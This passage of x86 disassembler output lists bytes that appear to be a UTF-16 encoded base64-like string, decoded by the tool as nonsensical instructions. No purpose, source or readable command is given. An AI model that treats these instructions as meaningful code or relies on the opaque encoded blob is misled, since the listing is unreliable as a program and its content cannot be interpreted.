  40ac13:	00 51 00             	add    %dl,0x0(%ecx)
  40ac16:	50                   	push   %eax
  40ac17:	00 6f 00             	add    %ch,0x0(%edi)
  40ac1a:	37                   	aaa
  40ac1b:	00 59 00             	add    %bl,0x0(%ecx)
  40ac1e:	5a                   	pop    %edx
  40ac1f:	00 59 00             	add    %bl,0x0(%ecx)
  40ac22:	63 00                	arpl   %eax,(%eax)
  40ac24:	4f                   	dec    %edi
  40ac25:	00 4a 00             	add    %cl,0x0(%edx)
  40ac28:	69 00 48 00 33 00    	imul   $0x330048,(%eax),%eax
  40ac2e:	43                   	inc    %ebx
  40ac2f:	00 6a 00             	add    %ch,0x0(%edx)
  40ac32:	32 00                	xor    (%eax),%al
  40ac34:	35 00 54 00 6b       	xor    $0x6b005400,%eax
  40ac39:	00 71 00             	add    %dh,0x0(%ecx)
  40ac3c:	51                   	push   %ecx
  40ac3d:	00 7a 00             	add    %bh,0x0(%edx)
  40ac40:	6b 00 64             	imul   $0x64,(%eax),%eax
  40ac43:	00 4e 00             	add    %cl,0x0(%esi)
  40ac46:	6d                   	insl   (%dx),%es:(%edi)
  40ac47:	00 58 00             	add    %bl,0x0(%eax)
  40ac4a:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac4b:	00 2f                	add    %ch,(%edi)
  40ac4d:	00 6d 00             	add    %ch,0x0(%ebp)
  40ac50:	30 00                	xor    %al,(%eax)
  40ac52:	5a                   	pop    %edx
  40ac53:	00 46 00             	add    %al,0x0(%esi)
  40ac56:	4c                   	dec    %esp
  40ac57:	00 67 00             	add    %ah,0x0(%edi)
  40ac5a:	72 00                	jb     0x40ac5c
  40ac5c:	45                   	inc    %ebp
  40ac5d:	00 6b 00             	add    %ch,0x0(%ebx)
  40ac60:	4d                   	dec    %ebp
  40ac61:	00 2f                	add    %ch,(%edi)
  40ac63:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  40ac67:	00 6a 00             	add    %ch,0x0(%edx)
  40ac6a:	42                   	inc    %edx
  40ac6b:	00 4f 00             	add    %cl,0x0(%edi)
  40ac6e:	77 00                	ja     0x40ac70
  40ac70:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac71:	00 44 00 57          	add    %al,0x57(%eax,%eax,1)
  40ac75:	00 2b                	add    %ch,(%ebx)
  40ac77:	00 41 00             	add    %al,0x0(%ecx)
  40ac7a:	77 00                	ja     0x40ac7c
  40ac7c:	4b                   	dec    %ebx
  40ac7d:	00 36                	add    %dh,(%esi)
  40ac7f:	00 73 00             	add    %dh,0x0(%ebx)
  40ac82:	4a                   	dec    %edx
  40ac83:	00 56 00             	add    %dl,0x0(%esi)
  40ac86:	63 00                	arpl   %eax,(%eax)
  40ac88:	66 00 41 00          	data16 add %al,0x0(%ecx)
  40ac8c:	66 00 46 00          	data16 add %al,0x0(%esi)
  40ac90:	63 00                	arpl   %eax,(%eax)
  40ac92:	71 00                	jno    0x40ac94
  40ac94:	6c                   	insb   (%dx),%es:(%edi)
  40ac95:	00 6b 00             	add    %ch,0x0(%ebx)
  40ac98:	5a                   	pop    %edx
  40ac99:	00 4b 00             	add    %cl,0x0(%ebx)
  40ac9c:	5a                   	pop    %edx
  40ac9d:	00 63 00             	add    %ah,0x0(%ebx)
  40aca0:	56                   	push   %esi
  40aca1:	00 79 00             	add    %bh,0x0(%ecx)
  40aca4:	47                   	inc    %edi
  40aca5:	00 63 00             	add    %ah,0x0(%ebx)
  40aca8:	5a                   	pop    %edx
  40aca9:	00 49 00             	add    %cl,0x0(%ecx)
  40acac:	78 00                	js     0x40acae
  40acae:	59                   	pop    %ecx
  40acaf:	00 58 00             	add    %bl,0x0(%eax)
  40acb2:	2f                   	das
  40acb3:	00 66 00             	add    %ah,0x0(%esi)
  40acb6:	68 00 78 00 64       	push   $0x64007800
  40acbb:	00 38                	add    %bh,(%eax)
  40acbd:	00 74 00 63          	add    %dh,0x63(%eax,%eax,1)
  40acc1:	00 72 00             	add    %dh,0x0(%edx)
  40acc4:	57                   	push   %edi
  40acc5:	00 73 00             	add    %dh,0x0(%ebx)
  40acc8:	46                   	inc    %esi
  40acc9:	00 73 00             	add    %dh,0x0(%ebx)
  40accc:	75 00                	jne    0x40acce
  40acce:	58                   	pop    %eax
  40accf:	00 48 00             	add    %cl,0x0(%eax)
  40acd2:	62 00                	bound  %eax,(%eax)
  40acd4:	57                   	push   %edi
  40acd5:	00 6e 00             	add    %ch,0x0(%esi)
  40acd8:	43                   	inc    %ebx
  40acd9:	00 5a 00             	add    %bl,0x0(%edx)
  40acdc:	4e                   	dec    %esi
  40acdd:	00 79 00             	add    %bh,0x0(%ecx)
  40ace0:	4b                   	dec    %ebx
  40ace1:	00 77 00             	add    %dh,0x0(%edi)
  40ace4:	43                   	inc    %ebx
  40ace5:	00 6b 00             	add    %ch,0x0(%ebx)
  40ace8:	6c                   	insb   (%dx),%es:(%edi)
  40ace9:	00 77 00             	add    %dh,0x0(%edi)
  40acec:	35 00 2b 00 72       	xor    $0x72002b00,%eax
  40acf1:	00 42 00             	add    %al,0x0(%edx)
  40acf4:	39 00                	cmp    %eax,(%eax)
  40acf6:	67 00 31             	add    %dh,(%bx,%di)
  40acf9:	00 63 00             	add    %ah,0x0(%ebx)
  40acfc:	30 00                	xor    %al,(%eax)
  40acfe:	39 00                	cmp    %eax,(%eax)
  40ad00:	58                   	pop    %eax
  40ad01:	00 4a 00             	add    %cl,0x0(%edx)
  40ad04:	49                   	dec    %ecx
  40ad05:	00 6d 00             	add    %ch,0x0(%ebp)
  40ad08:	44                   	inc    %esp
  40ad09:	00 78 00             	add    %bh,0x0(%eax)
  40ad0c:	51                   	push   %ecx
  40ad0d:	00 69 00             	add    %ch,0x0(%ecx)
  40ad10:	73 00                	jae    0x40ad12
  40ad12:	48                   	dec    %eax
  40ad13:	00 68 00             	add    %ch,0x0(%eax)
  40ad16:	36 00 33             	add    %dh,%ss:(%ebx)
  40ad19:	00 2f                	add    %ch,(%edi)
  40ad1b:	00 55 00             	add    %dl,0x0(%ebp)
  40ad1e:	32 00                	xor    (%eax),%al
  40ad20:	70 00                	jo     0x40ad22
  40ad22:	68 00 68 00 5a       	push   $0x5a006800
  40ad27:	00 75 00             	add    %dh,0x0(%ebp)
  40ad2a:	41                   	inc    %ecx
  40ad2b:	00 76 00             	add    %dh,0x0(%esi)
  40ad2e:	41                   	inc    %ecx
  40ad2f:	00 2b                	add    %ch,(%ebx)
  40ad31:	00 6d 00             	add    %ch,0x0(%ebp)
  40ad34:	58                   	pop    %eax
  40ad35:	00 42 00             	add    %al,0x0(%edx)
  40ad38:	56                   	push   %esi
  40ad39:	00 2b                	add    %ch,(%ebx)
  40ad3b:	00 76 00             	add    %dh,0x0(%esi)
  40ad3e:	71 00                	jno    0x40ad40
  40ad40:	52                   	push   %edx
  40ad41:	00 66 00             	add    %ah,0x0(%esi)
  40ad44:	72 00                	jb     0x40ad46
  40ad46:	6a 00                	push   $0x0
  40ad48:	4e                   	dec    %esi
  40ad49:	00 49 00             	add    %cl,0x0(%ecx)
  40ad4c:	6b 00 6e             	imul   $0x6e,(%eax),%eax
  40ad4f:	00 77 00             	add    %dh,0x0(%edi)
  40ad52:	37                   	aaa
  40ad53:	00 46 00             	add    %al,0x0(%esi)
  40ad56:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
  40ad5a:	6b 00 54             	imul   $0x54,(%eax),%eax
  40ad5d:	00 4d 00             	add    %cl,0x0(%ebp)
  40ad60:	32 00                	xor    (%eax),%al
  40ad62:	00 87 b1 32 00 34    	add    %al,0x340032b1(%edi)
  40ad68:	00 48 00             	add    %cl,0x0(%eax)
  40ad6b:	55                   	push   %ebp
  40ad6c:	00 36                	add    %dh,(%esi)
  40ad6e:	00 55 00             	add    %dl,0x0(%ebp)
  40ad71:	79 00                	jns    0x40ad73
  40ad73:	73 00                	jae    0x40ad75
  40ad75:	33 00                	xor    (%eax),%eax
  40ad77:	51                   	push   %ecx
  40ad78:	00 35 00 70 00 39    	add    %dh,0x39007000
  40ad7e:	00 43 00             	add    %al,0x0(%ebx)
  40ad81:	58                   	pop    %eax
  40ad82:	00 67 00             	add    %ah,0x0(%edi)
  40ad85:	44                   	inc    %esp
  40ad86:	00 32                	add    %dh,(%edx)
  40ad88:	00 6d 00             	add    %ch,0x0(%ebp)
  40ad8b:	50                   	push   %eax
  40ad8c:	00 6d 00             	add    %ch,0x0(%ebp)
  40ad8f:	4c                   	dec    %esp
  40ad90:	00 79 00             	add    %bh,0x0(%ecx)
  40ad93:	69 00 61 00 77 00    	imul   $0x770061,(%eax),%eax
  40ad99:	77 00                	ja     0x40ad9b
  40ad9b:	57                   	push   %edi
  40ad9c:	00 41 00             	add    %al,0x0(%ecx)
  40ad9f:	45                   	inc    %ebp
  40ada0:	00 43 00             	add    %al,0x0(%ebx)
  40ada3:	74 00                	je     0x40ada5
  40ada5:	2f                   	das
  40ada6:	00 2b                	add    %ch,(%ebx)
  40ada8:	00 6e 00             	add    %ch,0x0(%esi)
  40adab:	76 00                	jbe    0x40adad
  40adad:	50                   	push   %eax
  40adae:	00 36                	add    %dh,(%esi)
  40adb0:	00 4c 00 50          	add    %cl,0x50(%eax,%eax,1)
  40adb4:	00 78 00             	add    %bh,0x0(%eax)
  40adb7:	4c                   	dec    %esp
  40adb8:	00 4e 00             	add    %cl,0x0(%esi)
  40adbb:	6f                   	outsl  %ds:(%esi),(%dx)
  40adbc:	00 7a 00             	add    %bh,0x0(%edx)
  40adbf:	54                   	push   %esp
  40adc0:	00 37                	add    %dh,(%edi)
  40adc2:	00 34 00             	add    %dh,(%eax,%eax,1)
  40adc5:	73 00                	jae    0x40adc7
  40adc7:	58                   	pop    %eax
  40adc8:	00 4f 00             	add    %cl,0x0(%edi)
  40adcb:	50                   	push   %eax
  40adcc:	00 76 00             	add    %dh,0x0(%esi)
  40adcf:	79 00                	jns    0x40add1
  40add1:	30 00                	xor    %al,(%eax)
  40add3:	6f                   	outsl  %ds:(%esi),(%dx)
  40add4:	00 67 00             	add    %ah,0x0(%edi)
  40add7:	74 00                	je     0x40add9
  40add9:	69 00 62 00 69 00    	imul   $0x690062,(%eax),%eax
  40addf:	70 00                	jo     0x40ade1
  40ade1:	45                   	inc    %ebp
  40ade2:	00 6a 00             	add    %ch,0x0(%edx)
  40ade5:	51                   	push   %ecx
  40ade6:	00 76 00             	add    %dh,0x0(%esi)
  40ade9:	51                   	push   %ecx
  40adea:	00 54 00 4f          	add    %dl,0x4f(%eax,%eax,1)
  40adee:	00 59 00             	add    %bl,0x0(%ecx)
  40adf1:	6e                   	outsb  %ds:(%esi),(%dx)
  40adf2:	00 4b 00             	add    %cl,0x0(%ebx)
  40adf5:	49                   	dec    %ecx
  40adf6:	00 32                	add    %dh,(%edx)
  40adf8:	00 41 00             	add    %al,0x0(%ecx)
  40adfb:	30 00                	xor    %al,(%eax)
  40adfd:	41                   	inc    %ecx
  40adfe:	00 74 00 4b          	add    %dh,0x4b(%eax,%eax,1)
  40ae02:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ae05:	77 00                	ja     0x40ae07
  40ae07:	70 00                	jo     0x40ae09
  40ae09:	41                   	inc    %ecx
  40ae0a:	00 4b 00             	add    %cl,0x0(%ebx)
  40ae0d:	5a                   	pop    %edx
  40ae0e:	00 57 00             	add    %dl,0x0(%edi)
  40ae11:	4f                   	dec    %edi
  40ae12:	00 59 00             	add    %bl,0x0(%ecx)
  40ae15:	4b                   	dec    %ebx
  40ae16:	00 44 00 43          	add    %al,0x43(%eax,%eax,1)
  40ae1a:	00 79 00             	add    %bh,0x0(%ecx)
  40ae1d:	32 00                	xor    (%eax),%al
  40ae1f:	57                   	push   %edi
  40ae20:	00 42 00             	add    %al,0x0(%edx)
  40ae23:	79 00                	jns    0x40ae25
  40ae25:	4a                   	dec    %edx
  40ae26:	00 41 00             	add    %al,0x0(%ecx)
  40ae29:	64 00 38             	add    %bh,%fs:(%eax)
  40ae2c:	00 68 00             	add    %ch,0x0(%eax)
  40ae2f:	45                   	inc    %ebp
  40ae30:	00 39                	add    %bh,(%ecx)
  40ae32:	00 63 00             	add    %ah,0x0(%ebx)
  40ae35:	73 00                	jae    0x40ae37
  40ae37:	37                   	aaa
  40ae38:	00 59 00             	add    %bl,0x0(%ecx)
  40ae3b:	66 00 4a 00          	data16 add %cl,0x0(%edx)
  40ae3f:	4a                   	dec    %edx
  40ae40:	00 7a 00             	add    %bh,0x0(%edx)
  40ae43:	67 00 66 00          	add    %ah,0x0(%bp)
  40ae47:	4e                   	dec    %esi
  40ae48:	00 74 00 67          	add    %dh,0x67(%eax,%eax,1)
  40ae4c:	00 42 00             	add    %al,0x0(%edx)
  40ae4f:	58                   	pop    %eax
  40ae50:	00 31                	add    %dh,(%ecx)
  40ae52:	00 53 00             	add    %dl,0x0(%ebx)
  40ae55:	46                   	inc    %esi
  40ae56:	00 52 00             	add    %dl,0x0(%edx)
  40ae59:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae5a:	00 6b 00             	add    %ch,0x0(%ebx)
  40ae5d:	74 00                	je     0x40ae5f
  40ae5f:	55                   	push   %ebp
  40ae60:	00 68 00             	add    %ch,0x0(%eax)
  40ae63:	49                   	dec    %ecx
  40ae64:	00 44 00 43          	add    %al,0x43(%eax,%eax,1)
  40ae68:	00 2f                	add    %ch,(%edi)
  40ae6a:	00 73 00             	add    %dh,0x0(%ebx)
  40ae6d:	37                   	aaa
  40ae6e:	00 4d 00             	add    %cl,0x0(%ebp)
  40ae71:	6a 00                	push   $0x0
  40ae73:	31 00                	xor    %eax,(%eax)
  40ae75:	6d                   	insl   (%dx),%es:(%edi)
  40ae76:	00 6b 00             	add    %ch,0x0(%ebx)
  40ae79:	35 00 74 00 76       	xor    $0x76007400,%eax
  40ae7e:	00 50 00             	add    %dl,0x0(%eax)
  40ae81:	54                   	push   %esp
  40ae82:	00 42 00             	add    %al,0x0(%edx)
  40ae85:	30 00                	xor    %al,(%eax)
  40ae87:	4e                   	dec    %esi
  40ae88:	00 68 00             	add    %ch,0x0(%eax)
  40ae8b:	76 00                	jbe    0x40ae8d
  40ae8d:	6a 00                	push   $0x0
  40ae8f:	34 00                	xor    $0x0,%al
  40ae91:	43                   	inc    %ebx
  40ae92:	00 71 00             	add    %dh,0x0(%ecx)
  40ae95:	34 00                	xor    $0x0,%al
  40ae97:	47                   	inc    %edi
  40ae98:	00 58 00             	add    %bl,0x0(%eax)
  40ae9b:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae9c:	00 66 00             	add    %ah,0x0(%esi)
  40ae9f:	41                   	inc    %ecx
  40aea0:	00 63 00             	add    %ah,0x0(%ebx)
  40aea3:	34 00                	xor    $0x0,%al
  40aea5:	59                   	pop    %ecx
  40aea6:	00 44 00 53          	add    %al,0x53(%eax,%eax,1)
  40aeaa:	00 77 00             	add    %dh,0x0(%edi)
  40aead:	56                   	push   %esi
  40aeae:	00 75 00             	add    %dh,0x0(%ebp)
  40aeb1:	4a                   	dec    %edx
  40aeb2:	00 4a 00             	add    %cl,0x0(%edx)
  40aeb5:	6e                   	outsb  %ds:(%esi),(%dx)
  40aeb6:	00 51 00             	add    %dl,0x0(%ecx)
  40aeb9:	4b                   	dec    %ebx
  40aeba:	00 73 00             	add    %dh,0x0(%ebx)
  40aebd:	79 00                	jns    0x40aebf
  40aebf:	68 00 66 00 75       	push   $0x75006600
  40aec4:	00 58 00             	add    %bl,0x0(%eax)
  40aec7:	37                   	aaa
  40aec8:	00 56 00             	add    %dl,0x0(%esi)
  40aecb:	30 00                	xor    %al,(%eax)
  40aecd:	2f                   	das
  40aece:	00 53 00             	add    %dl,0x0(%ebx)
  40aed1:	43                   	inc    %ebx
  40aed2:	00 47 00             	add    %al,0x0(%edi)
  40aed5:	6f                   	outsl  %ds:(%esi),(%dx)
  40aed6:	00 45 00             	add    %al,0x0(%ebp)
  40aed9:	38 00                	cmp    %al,(%eax)
  40aedb:	30 00                	xor    %al,(%eax)
  40aedd:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
  40aee1:	47                   	inc    %edi
  40aee2:	00 43 00             	add    %al,0x0(%ebx)
  40aee5:	79 00                	jns    0x40aee7
  40aee7:	33 00                	xor    (%eax),%eax
  40aee9:	37                   	aaa
  40aeea:	00 6c 00 6a          	add    %ch,0x6a(%eax,%eax,1)
  40aeee:	00 62 00             	add    %ah,0x0(%edx)
  40aef1:	39 00                	cmp    %eax,(%eax)
  40aef3:	4d                   	dec    %ebp
  40aef4:	00 67 00             	add    %ah,0x0(%edi)
  40aef7:	48                   	dec    %eax
  40aef8:	00 6f 00             	add    %ch,0x0(%edi)
  40aefb:	50                   	push   %eax
  40aefc:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aeff:	5a                   	pop    %edx
  40af00:	00 35 00 76 00 70    	add    %dh,0x70007600
  40af06:	00 74 00 67          	add    %dh,0x67(%eax,%eax,1)
  40af0a:	00 79 00             	add    %bh,0x0(%ecx)
  40af0d:	59                   	pop    %ecx
  40af0e:	00 64 00 4a          	add    %ah,0x4a(%eax,%eax,1)
  40af12:	00 2f                	add    %ch,(%edi)
  40af14:	00 4c 00 74          	add    %cl,0x74(%eax,%eax,1)
  40af18:	00 79 00             	add    %bh,0x0(%ecx)
  40af1b:	79 00                	jns    0x40af1d
  40af1d:	45                   	inc    %ebp
  40af1e:	00 47 00             	add    %al,0x0(%edi)
  40af21:	63 00                	arpl   %eax,(%eax)
  40af23:	62 00                	bound  %eax,(%eax)
  40af25:	50                   	push   %eax
  40af26:	00 4b 00             	add    %cl,0x0(%ebx)
  40af29:	62 00                	bound  %eax,(%eax)
  40af2b:	70 00                	jo     0x40af2d
  40af2d:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
  40af31:	4d                   	dec    %ebp
  40af32:	00 69 00             	add    %ch,0x0(%ecx)
  40af35:	6c                   	insb   (%dx),%es:(%edi)
  40af36:	00 32                	add    %dh,(%edx)
  40af38:	00 46 00             	add    %al,0x0(%esi)
  40af3b:	33 00                	xor    (%eax),%eax
  40af3d:	67 00 55 00          	add    %dl,0x0(%di)
  40af41:	42                   	inc    %edx
  40af42:	00 52 00             	add    %dl,0x0(%edx)
  40af45:	44                   	inc    %esp
  40af46:	00 7a 00             	add    %bh,0x0(%edx)
  40af49:	50                   	push   %eax
  40af4a:	00 4f 00             	add    %cl,0x0(%edi)
  40af4d:	70 00                	jo     0x40af4f
  40af4f:	69 00 59 00 75 00    	imul   $0x750059,(%eax),%eax
  40af55:	6b 00 47             	imul   $0x47,(%eax),%eax
  40af58:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
  40af5c:	00 4c 00 46          	add    %cl,0x46(%eax,%eax,1)
  40af60:	00 54 00 38          	add    %dl,0x38(%eax,%eax,1)
  40af64:	00 41 00             	add    %al,0x0(%ecx)
  40af67:	57                   	push   %edi
  40af68:	00 56 00             	add    %dl,0x0(%esi)
  40af6b:	72 00                	jb     0x40af6d
  40af6d:	56                   	push   %esi
  40af6e:	00 54 00 39          	add    %dl,0x39(%eax,%eax,1)
  40af72:	00 35 00 73 00 42    	add    %dh,0x42007300
  40af78:	00 58 00             	add    %bl,0x0(%eax)
  40af7b:	62 00                	bound  %eax,(%eax)
  40af7d:	67 00 58 00          	add    %bl,0x0(%bx,%si)
  40af81:	6d                   	insl   (%dx),%es:(%edi)
  40af82:	00 72 00             	add    %dh,0x0(%edx)
  40af85:	51                   	push   %ecx
  40af86:	00 75 00             	add    %dh,0x0(%ebp)
  40af89:	57                   	push   %edi
  40af8a:	00 42 00             	add    %al,0x0(%edx)
  40af8d:	72 00                	jb     0x40af8f
  40af8f:	44                   	inc    %esp
  40af90:	00 43 00             	add    %al,0x0(%ebx)
  40af93:	30 00                	xor    %al,(%eax)
  40af95:	72 00                	jb     0x40af97
  40af97:	73 00                	jae    0x40af99
  40af99:	5a                   	pop    %edx
  40af9a:	00 67 00             	add    %ah,0x0(%edi)
  40af9d:	63 00                	arpl   %eax,(%eax)
  40af9f:	6c                   	insb   (%dx),%es:(%edi)
  40afa0:	00 46 00             	add    %al,0x0(%esi)
  40afa3:	73 00                	jae    0x40afa5
  40afa5:	6a 00                	push   $0x0
  40afa7:	4b                   	dec    %ebx
  40afa8:	00 72 00             	add    %dh,0x0(%edx)
  40afab:	44                   	inc    %esp
  40afac:	00 61 00             	add    %ah,0x0(%ecx)
  40afaf:	31 00                	xor    %eax,(%eax)
  40afb1:	52                   	push   %edx
  40afb2:	00 57 00             	add    %dl,0x0(%edi)
  40afb5:	56                   	push   %esi
  40afb6:	00 53 00             	add    %dl,0x0(%ebx)
  40afb9:	71 00                	jno    0x40afbb
  40afbb:	64 00 7a 00          	add    %bh,%fs:0x0(%edx)
  40afbf:	55                   	push   %ebp
  40afc0:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
  40afc4:	00 32                	add    %dh,(%edx)
  40afc6:	00 4d 00             	add    %cl,0x0(%ebp)
  40afc9:	4a                   	dec    %edx
  40afca:	00 35 00 6b 00 55    	add    %dh,0x55006b00
  40afd0:	00 52 00             	add    %dl,0x0(%edx)
  40afd3:	6b 00 66             	imul   $0x66,(%eax),%eax
  40afd6:	00 5a 00             	add    %bl,0x0(%edx)
  40afd9:	32 00                	xor    (%eax),%al
  40afdb:	2f                   	das
  40afdc:	00 42 00             	add    %al,0x0(%edx)
  40afdf:	6f                   	outsl  %ds:(%esi),(%dx)
  40afe0:	00 6d 00             	add    %ch,0x0(%ebp)
  40afe3:	44                   	inc    %esp
  40afe4:	00 68 00             	add    %ch,0x0(%eax)
  40afe7:	7a 00                	jp     0x40afe9
  40afe9:	35 00 52 00 47       	xor    $0x47005200,%eax
  40afee:	00 37                	add    %dh,(%edi)
  40aff0:	00 48 00             	add    %cl,0x0(%eax)
  40aff3:	57                   	push   %edi
  40aff4:	00 70 00             	add    %dh,0x0(%eax)
  40aff7:	6c                   	insb   (%dx),%es:(%edi)
  40aff8:	00 30                	add    %dh,(%eax)
  40affa:	00 71 00             	add    %dh,0x0(%ecx)
  40affd:	52                   	push   %edx
  40affe:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b001:	6e                   	outsb  %ds:(%esi),(%dx)
  40b002:	00 65 00             	add    %ah,0x0(%ebp)
  40b005:	6a 00                	push   $0x0
  40b007:	5a                   	pop    %edx
  40b008:	00 4a 00             	add    %cl,0x0(%edx)
  40b00b:	74 00                	je     0x40b00d
  40b00d:	45                   	inc    %ebp
  40b00e:	00 69 00             	add    %ch,0x0(%ecx)
  40b011:	31 00                	xor    %eax,(%eax)
  40b013:	57                   	push   %edi
  40b014:	00 66 00             	add    %ah,0x0(%esi)
  40b017:	77 00                	ja     0x40b019
  40b019:	44                   	inc    %esp
  40b01a:	00 61 00             	add    %ah,0x0(%ecx)
  40b01d:	32 00                	xor    (%eax),%al
  40b01f:	2f                   	das
  40b020:	00 64 00 77          	add    %ah,0x77(%eax,%eax,1)
  40b024:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b027:	78 00                	js     0x40b029
  40b029:	6f                   	outsl  %ds:(%esi),(%dx)
  40b02a:	00 77 00             	add    %dh,0x0(%edi)
  40b02d:	69 00 76 00 74 00    	imul   $0x740076,(%eax),%eax
  40b033:	46                   	inc    %esi
  40b034:	00 77 00             	add    %dh,0x0(%edi)
  40b037:	47                   	inc    %edi
  40b038:	00 73 00             	add    %dh,0x0(%ebx)
  40b03b:	50                   	push   %eax
  40b03c:	00 4b 00             	add    %cl,0x0(%ebx)
  40b03f:	31 00                	xor    %eax,(%eax)
  40b041:	6a 00                	push   $0x0
  40b043:	35 00 74 00 50       	xor    $0x50007400,%eax
  40b048:	00 36                	add    %dh,(%esi)
  40b04a:	00 2f                	add    %ch,(%edi)
  40b04c:	00 4c 00 2b          	add    %cl,0x2b(%eax,%eax,1)
  40b050:	00 52 00             	add    %dl,0x0(%edx)
  40b053:	6f                   	outsl  %ds:(%esi),(%dx)
  40b054:	00 77 00             	add    %dh,0x0(%edi)
  40b057:	6a 00                	push   $0x0
  40b059:	67 00 36 00 70       	add    %dh,0x7000
  40b05e:	00 71 00             	add    %dh,0x0(%ecx)
  40b061:	6e                   	outsb  %ds:(%esi),(%dx)
  40b062:	00 2b                	add    %ch,(%ebx)
  40b064:	00 35 00 68 00 72    	add    %dh,0x72006800
  40b06a:	00 75 00             	add    %dh,0x0(%ebp)
  40b06d:	33 00                	xor    (%eax),%eax
  40b06f:	37                   	aaa
  40b070:	00 6c 00 66          	add    %ch,0x66(%eax,%eax,1)
  40b074:	00 75 00             	add    %dh,0x0(%ebp)
  40b077:	37                   	aaa
  40b078:	00 4a 00             	add    %cl,0x0(%edx)
  40b07b:	59                   	pop    %ecx
  40b07c:	00 66 00             	add    %ah,0x0(%esi)
  40b07f:	4f                   	dec    %edi
  40b080:	00 54 00 59          	add    %dl,0x59(%eax,%eax,1)
  40b084:	00 68 00             	add    %ch,0x0(%eax)
  40b087:	45                   	inc    %ebp
  40b088:	00 72 00             	add    %dh,0x0(%edx)
  40b08b:	46                   	inc    %esi
  40b08c:	00 6f 00             	add    %ch,0x0(%edi)
  40b08f:	66 00 48 00          	data16 add %cl,0x0(%eax)
  40b093:	56                   	push   %esi
  40b094:	00 4a 00             	add    %cl,0x0(%edx)
  40b097:	32 00                	xor    (%eax),%al
  40b099:	57                   	push   %edi
  40b09a:	00 4c 00 64          	add    %cl,0x64(%eax,%eax,1)
  40b09e:	00 45 00             	add    %al,0x0(%ebp)
  40b0a1:	46                   	inc    %esi
  40b0a2:	00 59 00             	add    %bl,0x0(%ecx)
  40b0a5:	44                   	inc    %esp
  40b0a6:	00 6b 00             	add    %ch,0x0(%ebx)
  40b0a9:	61                   	popa
  40b0aa:	00 4e 00             	add    %cl,0x0(%esi)
  40b0ad:	51                   	push   %ecx
  40b0ae:	00 6f 00             	add    %ch,0x0(%edi)
  40b0b1:	7a 00                	jp     0x40b0b3
  40b0b3:	38 00                	cmp    %al,(%eax)
  40b0b5:	62 00                	bound  %eax,(%eax)
  40b0b7:	58                   	pop    %eax
  40b0b8:	00 4e 00             	add    %cl,0x0(%esi)
  40b0bb:	64 00 4c 00 6e       	add    %cl,%fs:0x6e(%eax,%eax,1)
  40b0c0:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  40b0c4:	00 38                	add    %bh,(%eax)
  40b0c6:	00 6d 00             	add    %ch,0x0(%ebp)
  40b0c9:	5a                   	pop    %edx
  40b0ca:	00 31                	add    %dh,(%ecx)
  40b0cc:	00 6e 00             	add    %ch,0x0(%esi)
  40b0cf:	62 00                	bound  %eax,(%eax)
  40b0d1:	70 00                	jo     0x40b0d3
  40b0d3:	38 00                	cmp    %al,(%eax)
  40b0d5:	4c                   	dec    %esp
  40b0d6:	00 46 00             	add    %al,0x0(%esi)
  40b0d9:	37                   	aaa
  40b0da:	00 33                	add    %dh,(%ebx)
  40b0dc:	00 4b 00             	add    %cl,0x0(%ebx)
  40b0df:	50                   	push   %eax
  40b0e0:	00 77 00             	add    %dh,0x0(%edi)
  40b0e3:	59                   	pop    %ecx
  40b0e4:	00 39                	add    %bh,(%ecx)
  40b0e6:	00 43 00             	add    %al,0x0(%ebx)
  40b0e9:	37                   	aaa
  40b0ea:	00 32                	add    %dh,(%edx)
  40b0ec:	00 6d 00             	add    %ch,0x0(%ebp)
  40b0ef:	55                   	push   %ebp
  40b0f0:	00 58 00             	add    %bl,0x0(%eax)
  40b0f3:	76 00                	jbe    0x40b0f5
  40b0f5:	4f                   	dec    %edi
  40b0f6:	00 49 00             	add    %cl,0x0(%ecx)
  40b0f9:	74 00                	je     0x40b0fb
  40b0fb:	50                   	push   %eax
  40b0fc:	00 2b                	add    %ch,(%ebx)
  40b0fe:	00 46 00             	add    %al,0x0(%esi)
  40b101:	6c                   	insb   (%dx),%es:(%edi)
  40b102:	00 75 00             	add    %dh,0x0(%ebp)
  40b105:	52                   	push   %edx
  40b106:	00 6b 00             	add    %ch,0x0(%ebx)
  40b109:	43                   	inc    %ebx
  40b10a:	00 42 00             	add    %al,0x0(%edx)
  40b10d:	72 00                	jb     0x40b10f
  40b10f:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
  40b113:	53                   	push   %ebx
  40b114:	00 2b                	add    %ch,(%ebx)
  40b116:	00 53 00             	add    %dl,0x0(%ebx)
  40b119:	54                   	push   %esp
  40b11a:	00 4a 00             	add    %cl,0x0(%edx)
  40b11d:	41                   	inc    %ecx
  40b11e:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b121:	38 00                	cmp    %al,(%eax)
  40b123:	6a 00                	push   $0x0
  40b125:	31 00                	xor    %eax,(%eax)
  40b127:	56                   	push   %esi
  40b128:	00 48 00             	add    %cl,0x0(%eax)
  40b12b:	6b 00 44             	imul   $0x44,(%eax),%eax
  40b12e:	00 41 00             	add    %al,0x0(%ecx)
  40b131:	6d                   	insl   (%dx),%es:(%edi)
  40b132:	00 44 00 6a          	add    %al,0x6a(%eax,%eax,1)
  40b136:	00 2b                	add    %ch,(%ebx)
  40b138:	00 69 00             	add    %ch,0x0(%ecx)
  40b13b:	65 00 2f             	add    %ch,%gs:(%edi)
  40b13e:	00 31                	add    %dh,(%ecx)
  40b140:	00 36                	add    %dh,(%esi)
  40b142:	00 42 00             	add    %al,0x0(%edx)
  40b145:	79 00                	jns    0x40b147
  40b147:	52                   	push   %edx
  40b148:	00 30                	add    %dh,(%eax)
  40b14a:	00 4f 00             	add    %cl,0x0(%edi)
  40b14d:	47                   	inc    %edi
  40b14e:	00 74 00 49          	add    %dh,0x49(%eax,%eax,1)
  40b152:	00 43 00             	add    %al,0x0(%ebx)
  40b155:	6c                   	insb   (%dx),%es:(%edi)
